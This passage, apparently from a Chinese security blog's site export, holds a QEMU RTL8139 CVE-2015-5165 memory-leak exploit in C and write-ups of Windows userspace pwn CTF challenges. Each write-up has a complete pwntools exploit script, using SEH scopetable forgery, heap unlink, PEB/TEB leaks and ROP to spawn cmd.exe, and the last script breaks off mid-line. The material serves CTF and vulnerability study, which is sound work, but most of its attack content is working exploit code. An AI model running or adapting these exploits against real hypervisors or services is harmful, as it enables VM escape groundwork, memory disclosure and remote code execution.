outl(AcceptMyPhys,RTL8139_PORT+RxConfig); outw(CPlusRxEnb|CPlusTxEnb,RTL8139_PORT+CpCmd); outb(CmdRxEnb|CmdTxEnb,RTL8139_PORT+ChipCmd);&#125;void rtl8139_packet_send(void* buffer, void* packet, size_t len) &#123; if (len &lt;= RTL8139_BUFFER_SIZE) &#123; memcpy(buffer,packet,len); outb(CPlus,RTL8139_PORT+TxPoll); //触发漏洞函数 &#125;&#125;void xxd(uint8_t* ptr, size_t size) &#123; for (size_t i = 0, j = 0; i &lt; size; ++i, ++j) &#123; if (i % 16 == 0) &#123; j = 0; printf("\n0x%08x: ", ptr + i); &#125; printf("%02x ", ptr[i]); if (j == 7) &#123; printf("- "); &#125; &#125; printf("\n");&#125;int main(int argc, char** argv) &#123; // 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616 // 可以收完 65535 字节数据 size_t rtl8139_rx_nb = 44; rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(PAGE_SIZE,rtl8139_rx_nb*sizeof(struct rtl8139_ring)); rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(PAGE_SIZE,rtl8139_rx_nb*sizeof(struct rtl8139_desc)); rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(PAGE_SIZE,sizeof(struct rtl8139_desc)); void* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE,RTL8139_BUFFER_SIZE); // change I/O privilege level iopl(3); // initialize Rx ring, Rx descriptor, Tx descriptor rtl8139_desc_config_rx(rtl8139_rx_ring,rtl8139_rx_desc,rtl8139_rx_nb); rtl8139_desc_config_tx(rtl8139_tx_desc,rtl8139_tx_buffer); rtl8139_card_config(); rtl8139_packet_send(rtl8139_tx_buffer,rtl8139_packet,sizeof(rtl8139_packet)); sleep(2); // print leaked data for (size_t i = 0;i &lt; rtl8139_rx_nb;++i) &#123; // RTL8139_BUFFER_SIZE 之后 4 字节数据为 Checksum xxd((uint8_t*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE); &#125; return 0;&#125; poc效果： 漏洞利用从泄露的数据中提取出text_base和phy_base。 感觉原作的方法效率太低。。。还是直接找偏移比较快，text_base可以用的偏移有很多，这里参考了ray-cp师傅的三个，自己找了一个，phy_base直接可以发现规律，泄露出来的0x7fxxxxxxxxxx清零后三个字节之后，再减去0x80000000即为phy_base： exp.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;sys/io.h&gt;// 页面相关参数#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)// Ethernet Frame 大小// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)#define RTL8139_BUFFER_SIZE 1514// RTL8139 网卡 PMIO 地址#define RTL8139_PORT 0xc000// Rx ownership flag#define CP_RX_OWN (1&lt;&lt;31)// w0 end of ring flag#define CP_RX_EOR (1&lt;&lt;30)// Rx buffer size mask 表示 0 ~ 12 位为 buffer size#define CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)// Tx ownership flag#define CP_TX_OWN (1&lt;&lt;31)// Tx end of ring flag#define CP_TX_EOR (1&lt;&lt;30)// last segment of received packet flag#define CP_TX_LS (1&lt;&lt;28)// large send packet flag#define CP_TX_LGSEN (1&lt;&lt;27)// IP checksum offload flag#define CP_TX_IPCS (1&lt;&lt;18)// TCP checksum offload flag#define CP_TX_TCPCS (1&lt;&lt;16)// RTL8139 网卡寄存器偏移地址enum RTL8139_registers &#123; TxAddr0 = 0x20, // Tx descriptor address ChipCmd = 0x37, TxConfig = 0x40, RxConfig = 0x44, TxPoll = 0xD9, // tell chip to check Tx descriptors for work CpCmd = 0xE0, // C+ Command register (C+ mode only) // 虽然名字写的 RxRingAddr, 但实际上是 Rx descriptor address RxRingAddrLO = 0xE4, // 32-bit low addr of Rx descriptor RxRingAddrHI = 0xE8, // 32-bit high addr of Rx descriptor&#125;;enum RTL_8139_tx_config_bits &#123; TxLoopBack = (1 &lt;&lt; 18) | (1 &lt;&lt; 17), // enable loopback test mode&#125;;enum RTL_8139_rx_mode_bits &#123; AcceptErr = 0x20, AcceptRunt = 0x10, AcceptBroadcast = 0x08, AcceptMulticast = 0x04, AcceptMyPhys = 0x02, AcceptAllPhys = 0x01,&#125;;enum RTL_8139_CplusCmdBits &#123; CPlusRxVLAN = 0x0040, /* enable receive VLAN detagging */ CPlusRxChkSum = 0x0020, /* enable receive checksum offloading */ CPlusRxEnb = 0x0002, CPlusTxEnb = 0x0001,&#125;;enum RT8139_ChipCmdBits &#123; CmdReset = 0x10, CmdRxEnb = 0x08, CmdTxEnb = 0x04, RxBufEmpty = 0x01,&#125;;enum RTL8139_TxPollBits &#123; CPlus = (0x1 &lt;&lt; 6),&#125;;// RTL8139 Rx / Tx descriptortypedef struct rtl8139_desc &#123; uint32_t dw0; uint32_t dw1; uint32_t buf_lo; uint32_t buf_hi;&#125;rtl8139_desc;// RTL8139 Rx / Tx ringtypedef struct rtl8139_ring &#123; struct rtl8139_desc* desc; void* buffer;&#125;rtl8139_ring;uint8_t rtl8139_packet[] = &#123; // Ethernet Frame Header 数据 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, // DST MAC 52:54:00:12:34:56 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, // SRC MAC 52:54:00:12:34:56 0x08, 0x00, // Length / Type: IPv4 // Ethernet Frame Payload 数据, 即 IPv4 数据包 // Version &amp; IHL(Internet Header Length) (0x04 &lt;&lt; 4) | 0x05, // 4bits version = 0x4x | 4bits hlen =0xx5 =&gt; 0x05 * 4 = 20 bytes 0x00, // 8bit TOS 0x00, 0x13, // 16bits Total Length = 0x13 = 19 bytes,19-20 = -1 = 0xFFFF, trigger vulnerability 0xde, 0xad, // 16bits Identification 0x40, 0x00, // 3bits Flags &amp; 13bits Fragment Offset 0x40, // 8bits TTL 0x06, // 8bits Protocol:TCP 0xde, 0xad, // 16bits Header checksum 0x7f, 0x00, 0x00, 0x01, // 32bits Source IP:127.0.0.1 0x7f, 0x00, 0x00, 0x01, // 32bits Destination IP:127.0.0.1 // IP Packet Payload 数据, 即 TCP 数据包 0xde, 0xad, // 16bits Source Port 0xbe, 0xef, // 16bits Destination Port 0x00, 0x00, 0x00, 0x00, // 32bits Sequence Number 0x00, 0x00, 0x00, 0x00, // 32bits Acknowledgement Number 0x50, // 01010000, 4bits Header Length = 5*4 = 20 &amp;&amp; 4bits null 0x10, // 00010000, 2bits null &amp;&amp; 2bits URG ACK PSH RST SYN FIN 0xde, 0xad, // 16bits Window Size 0xde, 0xad, // 16bits TCP checksum 0x00, 0x00 // 16bits Urgent Pointer&#125;;uint64_t get_physical_pfn(void* addr) &#123; uint64_t pfn = -1; FILE* fp = fopen("/proc/self/pagemap","rb"); if (!fp) &#123; return pfn; &#125; if (!fseek(fp,(unsigned long)addr/PAGE_SIZE*8,SEEK_SET)) &#123; fread(&amp;pfn,sizeof(pfn),1,fp); if (pfn &amp; PFN_PRESENT) &#123; pfn &amp;= PFN_PFN; &#125; &#125; fclose(fp); return pfn;&#125;uint64_t gva_to_gpa(void* addr) &#123; uint64_t pfn = get_physical_pfn(addr); return pfn * PAGE_SIZE + (uint64_t)addr % PAGE_SIZE;&#125;void rtl8139_desc_config_rx(rtl8139_ring* ring, rtl8139_desc* desc, size_t nb) &#123; size_t buffer_size = RTL8139_BUFFER_SIZE+4; for (size_t i = 0; i &lt; nb; ++i) &#123; memset(&amp;desc[i],0,sizeof(desc[i])); ring[i].desc = &amp;desc[i]; ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size); memset(ring[i].buffer,0,buffer_size); // descriptor owned by NIC 准备接收数据 ring[i].desc-&gt;dw0 |= CP_RX_OWN; if (i == nb-1) &#123; ring[i].desc-&gt;dw0 |= CP_RX_EOR; // End of Ring &#125; ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK; ring[i].desc-&gt;dw0 |= buffer_size; // buffer_size ring[i].desc-&gt;buf_lo = (uint32_t)gva_to_gpa(ring[i].buffer); &#125; // Rx descriptors address outl((uint32_t)gva_to_gpa(desc),RTL8139_PORT+RxRingAddrLO); outl(0,RTL8139_PORT+RxRingAddrHI);&#125;void rtl8139_desc_config_tx(rtl8139_desc* desc, void* buffer) &#123; memset(desc, 0, sizeof(rtl8139_desc)); desc-&gt;dw0 |= CP_TX_OWN | // descriptor owned by NIC 准备发送数据 CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN | CP_TX_IPCS | CP_TX_TCPCS; desc-&gt;dw0 += RTL8139_BUFFER_SIZE; desc-&gt;buf_lo = (uint32_t)gva_to_gpa(buffer); outl((uint32_t)gva_to_gpa(desc),RTL8139_PORT+TxAddr0); outl(0,RTL8139_PORT+TxAddr0+4);&#125;void rtl8139_card_config() &#123; // 触发漏洞需要设置的一些参数 outl(TxLoopBack,RTL8139_PORT+TxConfig); outl(AcceptMyPhys,RTL8139_PORT+RxConfig); outw(CPlusRxEnb|CPlusTxEnb,RTL8139_PORT+CpCmd); outb(CmdRxEnb|CmdTxEnb,RTL8139_PORT+ChipCmd);&#125;void rtl8139_packet_send(void* buffer, void* packet, size_t len) &#123; if (len &lt;= RTL8139_BUFFER_SIZE) &#123; memcpy(buffer,packet,len); outb(CPlus,RTL8139_PORT+TxPoll); &#125;&#125;void xxd(uint8_t* ptr, size_t size) &#123; for (size_t i = 0, j = 0; i &lt; size; ++i, ++j) &#123; if (i % 16 == 0) &#123; j = 0; printf("\n%p: ",ptr + i); &#125; printf("%02x ", ptr[i]); if (j == 7) &#123; printf("- "); &#125; &#125; printf("\n");&#125;uint64_t qemu_search_text_base(void* ptr, size_t size)&#123; size_t i,j; uint64_t property_get_bool_offset = 0x369597; uint64_t property_get_str_offset = 0x369340; uint64_t memory_region_destructor_none_offset = 0xed560; uint64_t address_space_io_offset = 0x8e5e80; uint64_t offset[]=&#123;property_get_bool_offset, property_get_str_offset, memory_region_destructor_none_offset,address_space_io_offset&#125;; uint64_t *int_ptr, addr, text_base =0; for (i=0; i&lt;size-8; i+=8) &#123; int_ptr = (uint64_t*)(ptr+i); addr = *int_ptr; for(j=0; j&lt;sizeof(offset)/sizeof(uint64_t); j++) &#123; if( ((addr &amp; 0xfffff00000000000) == 0x500000000000) &amp;&amp; (( (addr - offset[j]) &amp; 0xfff ) == 0) ) &#123; text_base = addr - offset[j]; //printf("[+]text_base_ptr: %p\n",int_ptr); break; &#125; if(text_base !=0) break; &#125; &#125; return text_base;&#125;uint64_t qemu_search_phy_base(void *ptr, size_t size)&#123; size_t i; uint64_t *int_ptr, addr, phy_base = 0; for (i = 0; i &lt; size-8; i += 8) &#123; int_ptr = (uint64_t*)(ptr+i); addr = *int_ptr; if((addr &amp; 0xfffff00000000000) == 0x700000000000) &#123; addr = addr &amp; 0xffffffffff000000; phy_base = addr - 0x80000000; //printf("[+]phy_base_ptr: %p\n",int_ptr); break; &#125; &#125; return phy_base;&#125;//可有可无uint64_t qemu_search_heap_base(void *ptr, size_t size, uint64_t text_base)&#123; size_t i; size_t j; uint64_t *int_ptr, addr, heap_base = 0; uint64_t target_offset[] = &#123;0x4a7c0, 0x1470208, 0x1765d70, 0xd3c748, 0xe883b8, 0x1470208&#125;; for (i = 0; i &lt; size-8; i += 8) &#123; int_ptr = (uint64_t*)(ptr+i); addr = *int_ptr; //printf("i: %d 0x%lx\n",i, addr); if((addr &amp; 0xffff00000000) == (text_base &amp; 0xffff00000000) &amp;&amp; addr!=0) &#123; if( (addr - text_base) &gt; 0xd5c000) &#123; for(j = 0; j &lt; sizeof(target_offset)/sizeof(int64_t); j++) &#123; if(((addr -target_offset[j])&amp;0xfff) == 0) &#123; heap_base = addr - target_offset[j]; break; &#125; &#125; &#125; &#125; if(heap_base != 0) break; &#125; return heap_base;&#125;int main(int argc, char** argv) &#123; // 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616 // 可以收完 65535 字节数据 size_t rtl8139_rx_nb = 44; rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(PAGE_SIZE,rtl8139_rx_nb*sizeof(struct rtl8139_ring)); rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(PAGE_SIZE,rtl8139_rx_nb*sizeof(struct rtl8139_desc)); rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(PAGE_SIZE,sizeof(struct rtl8139_desc)); void* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE,RTL8139_BUFFER_SIZE); // change I/O privilege level iopl(3); // initialize Rx ring, Rx descriptor, Tx descriptor rtl8139_desc_config_rx(rtl8139_rx_ring,rtl8139_rx_desc,rtl8139_rx_nb); rtl8139_desc_config_tx(rtl8139_tx_desc,rtl8139_tx_buffer); rtl8139_card_config(); rtl8139_packet_send(rtl8139_tx_buffer,rtl8139_packet,sizeof(rtl8139_packet)); sleep(2); // print leaked data for (size_t i = 0;i &lt; rtl8139_rx_nb;++i) &#123; // RTL8139_BUFFER_SIZE 之后 4 字节数据为 Checksum xxd((uint8_t*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE); &#125; //---------------------------------------------------------------------------------------- uint64_t text_base,phy_base,heap_base; for (int i=0; i &lt; rtl8139_rx_nb; i++) &#123; text_base = qemu_search_text_base(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE); if (text_base != 0) break; &#125; if (text_base == 0)&#123; puts("[-]text base not found\n"); exit(-1); &#125; printf("[+]text_base: %p\n",text_base); //---------------------------------------------------------------------------------------- for (int i=0; i &lt; rtl8139_rx_nb; i++) &#123; phy_base = qemu_search_phy_base(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE); if (phy_base != 0) break; &#125; if (phy_base == 0)&#123; puts("[-]phy base not found\n"); exit(-1); &#125; printf("[+]physical_base: %p\n", phy_base); return 0;&#125; 参考https://ray-cp.github.io/archivers/qemu-pwn-cve-2015-5165%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90 http://jiayy.me/2019/04/15/CVE-2015-5165-7504/ http://www.phrack.org/papers/vm-escape-qemu-case-study.html https://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/ http://realtek.info/pdf/rtl8139cp.pdf]]></content>
      <categories>
        <category>CVE分析</category>
      </categories>
      <tags>
        <tag>Qemu</tag>
        <tag>CVE分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows_Userspace_Pwn学习]]></title>
    <url>%2F2020%2F05%2F05%2FWindows_Userspace_Pwn%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[hitbgsec_babystack思路：程序开了SAFESEH，ebp之前有一堆检测。。。结构如下： 12345678| ebp ^ cookie | &lt;- ebp-0x1c ---&gt; 不能改，有栈溢出检测| ------------------ | &lt;- ebp-0x18 ---&gt; 随意| ------------------ | &lt;- ebp-0x14 ---&gt; 随意| Next_pointer | &lt;- ebp-0x10 ---&gt; SEH链结点，不能改| __except_handler4 | &lt;- ebp-0xc ---&gt; SEH链结点，不能改|scope_table ^ cookie| &lt;- ebp-0x8 ---&gt; 需泄露出cookie，然后伪造| trylevel | &lt;- ebp-0x4 ---&gt; 不用改，一般默认为0，不为-2即可| | &lt;- ebp 在栈上伪造一个scopetable即可： 1234567backdoor = 0x138D + bin_basescopetable = p32(0xFFFFFFE4) #抄原本的scopetablescopetable+= p32(0) #抄原本的scopetablescopetable+= p32(0xFFFFFF20) #抄原本的scopetablescopetable+= p32(0) #抄原本的scopetablescopetable+= p32(0xFFFFFFFE) #抄原本的scopetablescopetable+= p32(backdoor) exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#coding:utf-8from pwn import *#context.log_level = 'debug'p = remote('192.168.21.1',8888)p.recvuntil('stack address = ')stack = int(p.recvuntil('\r\n',drop=True),16)p.recvuntil('main address = ')main = int(p.recvuntil('\r\n',drop=True),16)bin_base = main-0x10b0log.success('bin_base = '+hex(bin_base))log.success('stack = '+hex(stack))__except_handler4 = 0x1460+bin_base___security_cookie_addr = 0x4004+bin_baselog.success('__except_handler4 = '+hex(__except_handler4))log.success('___security_cookie_addr = '+hex(___security_cookie_addr))p.recvuntil('Do you want to know more?\r\n')p.sendline('yes')p.recvuntil('know\r\n')p.sendline(str(___security_cookie_addr))p.recvuntil(' value is ')cookie = int(p.recvuntil('\r\n',drop=True),16)log.success('cookie = '+hex(cookie))p.recvuntil('Do you want to know more?\r\n')p.sendline('yes')p.recvuntil('know\r\n')p.sendline(str(stack+0x90-4))p.recvuntil(' value is ')Next_addr = int(p.recvuntil('\r\n',drop=True),16)log.success('Next_addr = '+hex(Next_addr))p.recvuntil('Do you want to know more?\r\n')p.sendline('xxrw')backdoor = 0x138D+bin_basescopetable = p32(0xFFFFFFE4)scopetable+= p32(0)scopetable+= p32(0xFFFFFF20)scopetable+= p32(0)scopetable+= p32(0xFFFFFFFE)scopetable+= p32(backdoor)fake_scope_table = stack+4payload = '\x11'*4+scopetable.ljust(0x7C,'\x11')payload+= p32((stack+0x9C)^cookie)+p32(0)payload+= p32(0)+p32(Next_addr)payload+= p32(__except_handler4)+p32(fake_scope_table^cookie)payload+= p32(0)p.sendline(payload)p.recvuntil('Do you want to know more?\r\n')p.sendline('yes')p.recvuntil('know\r\n')p.sendline('0')p.recvuntil('&gt;')p.sendline('chcp 65001')p.recvuntil('&gt;')p.sendline('cmd.exe')p.recvuntil('cmd.exe')p.interactive() 2019第五空间决赛_九果抄的上题。 2019SUCTF_babystack上面两题的稍微进化版。 思路：首先是个10进制转16进制的小算法，这个看不懂可以直接动态调，也能直接看出来，然后用除0异常触发藏在stu_EAACE0这个main函数的scopetable的HandlerFunc位置的后门函数，然后会来到一个和上面两题main函数很相似的函数。然后后续就和上面一样了，可能调偏移稍微麻烦一点。程序里有多处插了简单的桩，逆向时需稍稍注意。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#coding:utf-8from pwn import *#context.log_level = 'debug'p = remote('192.168.21.1',8889)p.recvuntil('stack address = ')stack = int(p.recvuntil('\r\n',drop=True),16)p.recvuntil('main address = 0x')main = p.recvuntil('\r\n',drop=True)bin_base = main[:-4]target = bin_base+'8551'bin_base = int(bin_base+'0000',16)log.success('stack = '+hex(stack))log.success('bin_base = '+hex(bin_base))p.recvuntil('So,Can You Tell me what did you know?\r\n')target = '0'*(8-len(target)) + targetp.sendline(target)p.recvuntil('Do you want to know more?\r\n')p.sendline('yes')p.recvuntil('Where do you want to know?\r\n')p.sendline(str(stack-0x30))p.recvuntil('value is ')Next_pointer = int(p.recvuntil('\r\n',drop=True),16)log.success('Next_pointer = '+hex(Next_pointer))p.recvuntil('Do you want to know more?\r\n')p.sendline('yes')p.recvuntil('Where do you want to know?\r\n')p.sendline(str(bin_base+0x7c004))p.recvuntil('value is ')cookie = int(p.recvuntil('\r\n',drop=True),16)log.success('cookie = '+hex(cookie))backdoor = bin_base+0x8266scopetable = p32(0xFFFFFFE4)scopetable+= p32(0)scopetable+= p32(0xFFFFFF0C)scopetable+= p32(0)scopetable+= p32(0xFFFFFFFE)scopetable+= p32(backdoor)fake_scope_table = stack-0xc8payload = '\x11'*4+scopetable.ljust(0x90-4,'\x11')payload+= p32((stack-0x20)^cookie)+p32(0)+p32(0)payload+= p32(Next_pointer)+p32(bin_base+0x9a30)payload+= p32(fake_scope_table^cookie)+p32(0)p.recvuntil('Do you want to know more?\r\n')p.sendline('xxrw')p.sendline(payload)p.recvuntil('Do you want to know more?\r\n')p.sendline('yes')p.recvuntil('Where do you want to know?\r\n')p.sendline('0')p.interactive() 2019OGeek_babyheap思路：Re：当时做的时候，首先在逆向上卡住了，按不了F5，现在又重新逆了一遍。。。瞎弄了一波，调整了栈帧等，终于可以按F5了，不过M4x师傅也在github上放了这题的源码。 Pwn：当时做的时候，算是第一次碰到关于heap的winpwn，由于对Rtlheap一窍不通，所以觉得这题可能很难，实际上现在看来就是个经典的堆溢出，可能放到linux下可以直接秒杀的那种。 流程：堆溢出 =&gt; 改next__HEAP_ENTRY(freed)的FLink和Blink =&gt; unlink =&gt; Arbitrary address rw =&gt; hijick stack =&gt; ROP Ex师傅的文章已经给了很细致的分析，我这里只记录几个自己的发现。 babyheap模块是导入了ntdll.dll模块的函数的，HeapAlloc和InitializeSListHead都是，所以就没有了泄露KERNEL32的必要了，具体为什么请自己调试。 最后爆破main_ret_addr的时候，我感觉每次show多一点貌似会快一点？可能是我个人感觉问题233。 查看teb之前需要切换到主线程，命令请看本文最后的windbg使用笔记。 关于编码问题，linux的中文编码方式是unicode，win是gbk，所以拿到shell需要转码。(如果你win是英文当我没说) exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#coding:utf-8from pwn import *#context.log_level = 'debug'p = remote('192.168.21.1',10002)def new(size,content): p.recvuntil('choice?\r\n') p.sendline('1') p.recvuntil('sword?\r\n') p.sendline(str(size)) p.recvuntil('Name it!\r\n') p.send(content)def delete(index): p.recvuntil('choice?\r\n') p.sendline('2') p.recvuntil('destroy?\r\n') p.sendline(str(index))def show(index): p.recvuntil('choice?\r\n') p.sendline('4') p.recvuntil('check?\r\n') p.sendline(str(index))def edit(index,size,content): p.recvuntil('choice?\r\n') p.sendline('3') p.recvuntil('polish?\r\n') p.sendline(str(index)) p.recvuntil('time?\r\n') p.sendline(str(size)) p.recvuntil('again : \r\n') p.send(content)p.recvuntil('And here is your Novice village gift : ')bin_base = int(p.recvuntil('\r\n',drop=True),16) - 0x1090log.success('bin_base = '+hex(bin_base))ptr_list = bin_base + 0x4370key_list = bin_base + 0x43BCfor i in range(6): new(0x18,'\n')delete(2)edit(1,0x18,'\x11'*0x18+'\n')show(1)p.recvuntil('\x11'*0x18)free_heap_header = u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00'))#-----------------------------unlink----------------------------------delete(4)target = ptr_list + 8payload = '\x11'*0x18 + p64(free_heap_header)payload+= p32(target-4) + p32(target) + '\n'edit(1,0x28,payload)delete(1)p.recvuntil('choice?\r\n')p.sendline('1337')p.recvuntil('target?\r\n')p.sendline(str(key_list+2))edit(2,4,p32(ptr_list+0xC)+'\n')#--------------------------leak .dlls---------------------------------puts_iat = bin_base + 0x30c8sleep_iat = bin_base + 0x3008InitializeSListHead_iat = bin_base + 0x3014edit(2,4,p32(puts_iat)+'\n')show(3)p.recvuntil('Show : ')ucrtbase = u32(p.recv(4)) - (0x759789f0-0x758C0000)log.success('ucrtbase = '+hex(ucrtbase))edit(2,4,p32(InitializeSListHead_iat)+'\n')show(3)p.recvuntil('Show : ')ntdll = u32(p.recv(4)) - (0x77686df0-0x77620000)log.success('ntdll = ' + hex(ntdll))#---------------------leak teb,peb,stack_end---------------------------ntdll_PebLdr_addr = ntdll + 0x120c40log.success('ntdll_PebLdr_addr = ' + hex(ntdll_PebLdr_addr))edit(2,4,p32(ntdll_PebLdr_addr-52)+'\n')show(3)p.recvuntil('Show : ')Peb_addr = u32(p.recvuntil('\r\n',drop=True).ljust(4,'\x00')) - 0x21clog.success('Peb_addr = ' + hex(Peb_addr))Teb_addr = Peb_addr + 0x3000log.success('Teb_addr = ' + hex(Teb_addr))result = ''while(len(result) &lt; 4): result_length = len(result) edit(2,4,p32(Teb_addr+4+result_length)+'\n') show(3) p.recvuntil('Show : ') result += p.recvuntil('\r\n',drop=True)+'\x00'stack = u32(result[:4])log.success('stack = '+hex(stack))#--------------------find main_ret_addr----------------------------edit(2,4,p32(key_list+3)+'\n')edit(3,14,p8(1)*14+'\n')main_ret_content = bin_base + 0x193blog.info('Start finding main_ret_addr,it will take about 30s,please wait...:)')main_ret_addr = 0for addr in range(stack-0x1000,stack,0x4*14)[::-1]: if(main_ret_addr == 0): payload = p32(addr)+p32(addr+4)+p32(addr+8)+p32(addr+0xc) payload+= p32(addr+0x10)+p32(addr+0x14)+p32(addr+0x18)+p32(addr+0x1c) payload+= p32(addr+0x20)+p32(addr+0x24)+p32(addr+0x28)+p32(addr+0x2c) payload+= p32(addr+0x30)+p32(addr+0x34) edit(2,0x4*14,payload+'\n') for i in range(3,3+14): show(i) p.recvuntil('Show : ') result = p.recvuntil('\r\n',drop=True)[:4] content = u32(result.ljust(4,'\x00')) if(content == main_ret_content): main_ret_addr = addr+(i-3)*4 breaklog.success('main_ret_addr = ' + hex(main_ret_addr))edit(2,0x10,p32(main_ret_addr)+'cmd.exe\x00'+'\n')#----------------------------ROP-----------------------------------rop = [ ucrtbase + 0x000efda0, 0xdeadbeef, ptr_list+0x10]payload = flat(rop)raw_input('[+] please Enter to ROP...:)')edit(3,len(payload),payload+'\n')p.recvuntil('choice?\r\n')p.sendline('5')p.recvuntil('&gt;')p.sendline('chcp 65001')p.recvuntil('&gt;')p.sendline('cmd.exe')p.recvuntil('cmd.exe')p.interactive() 2019Hitcon_dadadb思路：开启LFH =&gt; 利用填满Userblock的方法进行稳定泄露heap =&gt; 从_HEAP中的_HEAP_LOCK泄露ntdll基址 =&gt; 泄露binbase和KERNEL32等基址 =&gt; 劫持listhint[0x10]到bss上 =&gt; 在bss上伪造fake_chunk =&gt; 改写user.txt的fp并在bss上伪造file_struct =&gt; 改写login返回地址为ropchain =&gt; shellcode读flag。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252#coding:utf-8from pwn import *context.arch = "amd64"p = remote('192.168.21.1',8888)def login(user,name): p.recvuntil("&gt;&gt;") p.sendline("1") p.recvuntil(":") p.sendline(user) p.recvuntil(":") p.sendline(name)def logout(): p.recvuntil('&gt;&gt; ') p.sendline('4')def add(key,size,content): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('Key:') p.send(key) p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Data:') p.send(content)def delete(key): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('Key:') p.send(key)def show(key): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('Key:') p.send(key)login('orange','godlike')#Enable LFHfor i in range(19): add("\x01lays"+str(i),0x90,"fuck")#Fill UserBlockfor i in range(0x10): add("\x02xxrw_"+str(i),0x90,"xxrw")#leave a holedelete("\x02xxrw_15")#Fill the hole with structureadd("\x02xxrw_14",0x60,'\x14'*0x70) show("\x02xxrw_14")p.recvuntil('\x14'*0x70)heapbase = u64(p.recv(8)) &amp; 0xffffffffffff0000if heapbase == 0: log.info('bad luck...try again~~~') exit()log.success('heapbase = '+hex(heapbase))p.recvuntil(p64(0x90))key = p.recvuntil("\x00")[:-1]log.success('next_key = '+key)#--------------------------------------------------------add('\x02xxrw_14',0x60,'\x14'*0x70+p64(heapbase+0x10))show(key)dump = p.recvuntil('orange')log.info('check...')if p32(0xffeeffee) not in dump: log.info('bad luck...try again~~~') exit()log.success('success!!!')def readmem(addr): global key add('\x02xxrw_14',0x60,'\x14'*0x70+p64(addr)) show(key) p.recvuntil(":") return u64(p.recvuntil("orange")[:8].ljust(8,"\x00"))_heap_lock = readmem(heapbase+0x2c0)log.success('_heap_lock = '+hex(_heap_lock))ntdll = _heap_lock + (0x7ffcb0ad0000-0x7ffcb0c33d30) - 0x60log.success('ntdll = '+hex(ntdll))PebLdr_addr = ntdll + (0x7ffcb0c353c0-ntdll)log.success('PebLdr_addr = '+hex(PebLdr_addr))immol = PebLdr_addr + 0x20ldrdata = readmem(immol)binentry = readmem(ldrdata + 0x28)binbase = binentry-0x1e54-0x1c-0x40log.success('binbase = '+hex(binbase))Peb = readmem(PebLdr_addr-(0xc0-0x88)) - 0x340log.success('Peb = '+hex(Peb))Teb = Peb + 0x1000log.success('Teb = '+hex(Teb))IAT = binbase + 0x3000KERNEL32_ReadFile = readmem(IAT)KERNEL32 = KERNEL32_ReadFile - (0x0007ffcafb82680-0x7ffcafb60000)log.success('KERNEL32 = '+hex(KERNEL32))stack_end = readmem(Teb+0x8)log.success('stack_end = '+hex(stack_end))cookie = readmem(heapbase+0x88)log.success('cookie = '+hex(cookie))processparameter = readmem(Peb+0x20)hstdin = readmem(processparameter+0x20)log.success('hstdin = '+hex(hstdin))password = binbase+0x5648start = stack_end-8ret = 0#ret_addr = binbase+0x1E38ret_addr = 